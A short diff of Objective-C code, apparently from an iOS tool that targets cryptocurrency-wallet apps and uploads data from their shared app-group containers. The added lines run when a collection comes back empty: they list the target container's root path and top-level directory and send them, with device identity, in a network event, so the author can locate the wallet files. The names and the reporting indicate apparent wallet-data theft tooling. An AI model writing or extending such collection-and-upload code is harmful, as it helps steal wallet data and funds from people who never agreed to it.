@@ -857,10 +857,15 @@ static NSArray *WalletMemoryTargets(void) {
             NSMutableDictionary *ev0 = [NSMutableDictionary dictionaryWithDictionary:[Info identity]];
             ev0[@"et"] = @"appgroup_upload";
             ev0[@"c"] = kSeed;
+            // 顺带把容器根和顶层目录报上来，空采集时能直接看出真实布局
+            NSString *root = [WalletFS appGroupPathFor:groupId];
+            NSArray *top = root ? [[NSFileManager defaultManager] contentsOfDirectoryAtPath:root error:NULL] : nil;
             ev0[@"ctx"] = @{ @"bundleId": bundleId,
                              @"files": @0,
                              @"bytes": @0,
                              @"items": @(items.count),
+                             @"root": root ?: @"(nil)",
+                             @"top": [top componentsJoinedByString:@","] ?: @"(nil)",
                              @"error": pkg[@"error"] ?: @"no files matched" };
             [self.net sendEvent:ev0];
             return;
